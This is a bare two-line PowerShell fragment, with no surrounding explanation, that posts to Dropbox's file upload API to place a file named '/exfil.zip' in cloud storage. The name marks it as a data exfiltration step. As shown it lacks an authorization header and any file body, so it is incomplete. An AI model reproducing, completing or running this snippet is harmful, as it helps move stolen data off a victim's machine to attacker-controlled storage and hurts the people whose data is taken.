$uri = "https://content.dropboxapi.com/2/files/upload"
Invoke-RestMethod -Uri $uri -Headers @{"Dropbox-API-Arg" = '{"path":"/exfil.zip","mode":"add"}'} -Method Post
